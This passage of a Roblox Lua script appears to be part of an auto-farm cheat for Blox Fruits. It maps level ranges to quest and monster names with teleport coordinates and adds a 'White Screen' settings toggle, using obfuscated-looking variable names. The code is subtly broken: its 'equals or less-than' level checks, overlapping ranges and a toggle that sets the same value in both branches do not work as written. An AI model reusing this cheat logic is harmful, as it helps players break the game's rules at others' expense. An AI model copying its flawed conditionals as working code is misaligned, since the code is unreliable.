			CFrameQuest = CFrame.new(- 9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, - 0, - 1, 0, 0)
			CFrameMon = CFrame.new(- 10144.1318359375, 138.62667846679688, 5838.0888671875)
		elseif MyLevel == 2025 or MyLevel <= 2049 then
			NameMon, NameQuest, LevelQuest = "Demonic Soul", "HauntedQuest2", 1;
			CFrameQuest = CFrame.new(- 9516.99316, 172.017181, 6078.46533, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
			CFrameMon = CFrame.new(- 9505.8720703125, 172.10482788085938, 6158.9931640625)
		elseif MyLevel == 2050 or MyLevel <= 2074 then
			NameMon, NameQuest, LevelQuest = "Posessed Mummy", "HauntedQuest2", 2;
			CFrameQuest = CFrame.new(- 9516.99316, 172.017181, 6078.46533, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
			CFrameMon = CFrame.new(- 9582.0224609375, 6.251527309417725, 6205.478515625)
		elseif MyLevel == 2075 or MyLevel <= 2099 then
			NameMon, NameQuest, LevelQuest = "Peanut Scout", "NutsIslandQuest", 1;
			CFrameQuest = CFrame.new(- 2104.3908691406, 38.104167938232, - 10194.21875, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
			CFrameMon = CFrame.new(- 2143.241943359375, 47.72198486328125, - 10029.9951171875)
		elseif MyLevel == 2100 or MyLevel <= 2124 then
			NameMon, NameQuest, LevelQuest = "Peanut President", "NutsIslandQuest", 2;
			CFrameQuest = CFrame.new(- 2104.3908691406, 38.104167938232, - 10194.21875, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
			CFrameMon = CFrame.new(- 1859.35400390625, 38.10316848754883, - 10422.4296875)
		elseif MyLevel == 2125 or MyLevel <= 2149 then
			NameMon, NameQuest, LevelQuest = "Ice Cream Chef", "IceCreamIslandQuest", 1;
			CFrameQuest = CFrame.new(- 820.64825439453, 65.819526672363, - 10965.795898438, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
			CFrameMon = CFrame.new(- 872.24658203125, 65.81957244873047, - 10919.95703125)
		elseif MyLevel == 2150 or MyLevel <= 2199 then
			NameMon, NameQuest, LevelQuest = "Ice Cream Commander", "IceCreamIslandQuest", 2;
			CFrameQuest = CFrame.new(- 820.64825439453, 65.819526672363, - 10965.795898438, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
			CFrameMon = CFrame.new(- 558.06103515625, 112.04895782470703, - 11290.7744140625)
		elseif MyLevel == 2200 or MyLevel <= 2224 then
			NameMon, NameQuest, LevelQuest = "Cookie Crafter", "CakeQuest1", 1;
			CFrameQuest = CFrame.new(- 2021.32007, 37.7982254, - 12028.7295, 0.957576931, - 8.80302053e-08, 0.288177818, 6.9301187e-08, 1, 7.51931211e-08, - 0.288177818, - 5.2032135e-08, 0.957576931)
			CFrameMon = CFrame.new(- 2374.13671875, 37.79826354980469, - 12125.30859375)
		elseif MyLevel == 2225 or MyLevel <= 2249 then
			NameMon, NameQuest, LevelQuest = "Cake Guard", "CakeQuest1", 2;
			CFrameQuest = CFrame.new(- 2021.32007, 37.7982254, - 12028.7295, 0.957576931, - 8.80302053e-08, 0.288177818, 6.9301187e-08, 1, 7.51931211e-08, - 0.288177818, - 5.2032135e-08, 0.957576931)
			CFrameMon = CFrame.new(- 1598.3070068359375, 43.773197174072266, - 12244.5810546875)
		elseif MyLevel == 2250 or MyLevel <= 2274 then
			NameMon, NameQuest, LevelQuest = "Baking Staff", "CakeQuest2", 1;
			CFrameQuest = CFrame.new(- 1927.91602, 37.7981339, - 12842.5391, - 0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, - 0.250778586, 2.64211941e-08, - 0.96804446)
			CFrameMon = CFrame.new(- 1887.8099365234375, 77.6185073852539, - 12998.3505859375)
		elseif MyLevel == 2275 or MyLevel <= 2299 then
			NameMon, NameQuest, LevelQuest = "Head Baker", "CakeQuest2", 2;
			CFrameQuest = CFrame.new(- 1927.91602, 37.7981339, - 12842.5391, - 0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, - 0.250778586, 2.64211941e-08, - 0.96804446)
			CFrameMon = CFrame.new(- 2216.188232421875, 82.884521484375, - 12869.2939453125)
		elseif MyLevel == 2300 or MyLevel <= 2324 then
			NameMon, NameQuest, LevelQuest = "Cocoa Warrior", "ChocQuest1", 1;
			CFrameQuest = CFrame.new(233.22836303710938, 29.876001358032227, - 12201.2333984375)
			CFrameMon = CFrame.new(- 21.55328369140625, 80.57499694824219, - 12352.3876953125)
		elseif MyLevel == 2325 or MyLevel <= 2349 then
			NameMon, NameQuest, LevelQuest = "Chocolate Bar Battler", "ChocQuest1", 2;
			CFrameQuest = CFrame.new(233.22836303710938, 29.876001358032227, - 12201.2333984375)
			CFrameMon = CFrame.new(582.590576171875, 77.18809509277344, - 12463.162109375)
		elseif MyLevel == 2350 or MyLevel <= 2374 then
			NameMon, NameQuest, LevelQuest = "Sweet Thief", "ChocQuest2", 1;
			CFrameQuest = CFrame.new(150.5066375732422, 30.693693161010742, - 12774.5029296875)
			CFrameMon = CFrame.new(165.1884765625, 76.05885314941406, - 12600.8369140625)
		elseif MyLevel == 2375 or MyLevel <= 2399 then
			NameMon, NameQuest, LevelQuest = "Candy Rebel", "ChocQuest2", 2;
			CFrameQuest = CFrame.new(150.5066375732422, 30.693693161010742, - 12774.5029296875)
			CFrameMon = CFrame.new(134.86563110351562, 77.2476806640625, - 12876.5478515625)
		elseif MyLevel == 2400 or MyLevel <= 2449 then
			NameMon, NameQuest, LevelQuest = "Candy Pirate", "CandyQuest1", 1;
			CFrameQuest = CFrame.new(- 1150.0400390625, 20.378934860229492, - 14446.3349609375)
			CFrameMon = CFrame.new(- 1310.5003662109375, 26.016523361206055, - 14562.404296875)
		elseif MyLevel == 2425 or MyLevel <= 2450 then
			NameMon, NameQuest, LevelQuest = "Snow Demon", "CandyQuest1", 2;
			CFrameQuest = CFrame.new(- 1150.0400390625, 20.378934860229492, - 14446.3349609375)
			CFrameMon = CFrame.new(- 750.1473388671875, 15.250883102416992, - 14343.2578125)
		elseif MyLevel == 2450 or MyLevel <= 2475 then
			NameMon, NameQuest, LevelQuest = "Isle Outlaw", "TikiQuest1", 1;
			CFrameQuest = CFrame.new(- 16547.45703125, 56.00029754638672, - 174.1670684814453)
			CFrameMon = CFrame.new(- 16303.1435546875, 188.16168212890625, - 268.9233703613281)
		elseif MyLevel == 2475 or MyLevel <= 2525 then
			NameMon, NameQuest, LevelQuest = "Island Boy", "TikiQuest1", 2;
			CFrameQuest = CFrame.new(- 16547.45703125, 56.00029754638672, - 174.1670684814453)
			CFrameMon = CFrame.new(- 16303.1435546875, 188.16168212890625, - 268.9233703613281)
		elseif MyLevel == 2525 or MyLevel <= 2550 then
			NameMon, NameQuest, LevelQuest = "Isle Champion", "TikiQuest2", 2;
			CFrameQuest = CFrame.new(- 16523.0996, 55.9234467, 1049.65784, - 0.418787986, - 0.0126074236, 0.907996595, - 0.0160101596, 0.99985069, 0.00649857335, - 0.907942891, - 0.0118156485, - 0.418927342)
			CFrameMon = CFrame.new(- 16748.4609375, 94.38502502441406, 1129.7178955078125)
		elseif MyLevel >= 2550 or MyLevel <= 2600 then
			NameMon, NameQuest, LevelQuest = "Serpent Hunter", "TikiQuest3", 1;
			CFrameQuest = CFrame.new(- 16665.462890625, 105.3105697631836, 1577.8289794921875)
			CFrameMon = CFrame.new(- 16959.2734375, 110.61740112304688, 1669.6007080078125)
		end
	end
end;
L_35_.Setting:Toggle("White Screen", true, function(L_244_arg0)
	_25msShared.WhiteScreen = L_244_arg0;
	if _25msShared.WhiteScreen then
		L_8_:Set3dRenderingEnabled(true)
	else
		L_8_:Set3dRenderingEnabled(true)
	end
end);
